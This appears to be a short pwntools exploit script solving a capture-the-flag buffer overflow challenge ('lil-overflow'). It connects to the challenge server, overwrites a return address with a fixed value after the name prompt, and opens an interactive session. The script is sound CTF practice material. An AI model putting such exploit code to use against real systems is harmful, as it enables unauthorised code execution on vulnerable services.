from pwn import *

context.arch = 'amd64'
p = remote('lil-overflow.challs.olicyber.it', 34002)

payload = b'A' * 32 + b'B' * 8 + p64(0x5ab1bb0)
print(p.recvuntil(b'your name?'))
p.sendline(payload)

p.interactive()